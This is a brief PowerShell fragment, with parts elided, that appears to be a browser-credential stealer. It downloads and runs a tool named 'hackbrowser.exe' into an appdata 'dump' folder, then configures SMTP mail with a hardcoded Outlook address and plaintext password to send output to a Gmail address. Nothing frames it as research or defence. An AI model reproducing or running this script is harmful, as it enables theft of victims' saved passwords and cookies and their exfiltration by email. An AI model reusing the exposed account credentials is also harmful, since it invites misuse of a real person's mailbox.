...
Invoke-WebRequest -Uri "link hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("enzoclprado2@outlook.com", "Enzoprado1203*");
$smtp.EnableSsl = $true
$Message.From = "enzoclprado2@outlook.com"
$Message.To.Add("enzoclprado2@gmail.com")
